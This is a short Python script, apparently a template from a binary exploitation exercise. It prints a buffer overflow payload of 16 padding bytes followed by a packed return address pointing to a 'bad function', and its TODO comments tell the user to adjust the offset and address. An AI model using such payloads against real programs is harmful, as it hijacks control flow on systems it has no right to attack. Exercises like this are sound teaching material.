import struct
import sys
# TODO: Fix this address to represent your bad function address
bad_address=0x80497b5
# TODO: Fix the number 16 in case you found a different number on your end.
sys.stdout.buffer.write(b"a"*16 + struct.pack("<I", bad_address))